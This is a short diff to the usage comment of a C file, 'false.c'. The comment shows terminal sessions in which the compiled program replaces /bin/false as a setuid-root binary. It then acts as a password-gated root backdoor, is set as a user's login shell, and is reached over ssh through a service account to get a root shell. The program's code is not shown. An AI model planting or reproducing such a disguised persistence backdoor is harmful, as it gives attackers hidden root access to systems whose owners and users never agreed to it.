@@ -1,10 +1,21 @@
+
 /*
+Usage:
 
 root@owned~# gcc false.c -o /bin/false -lcrypt ;chmod u+s /bin/false ;su lol
-lol@owned~# false lol
+lol@owned~$ false lol
 password:
-root@owned~#
-
+root@owned~# usermod -s /bin/false lol
+root@owned~# exit
+lol@owned~$ exit
+exit
+me@secure~$ ssh mysql@db -C whatever
+mysql@owned3ploxify.onion's password: 
+Could not chdir to home directory /nonexistent: No such file or directory
+Password:lol
+bash: cannot set terminal process group (-1): Inappropriate ioctl for device
+bash: no job control in this shell
+root@owned:/# 
 */
 
 /*
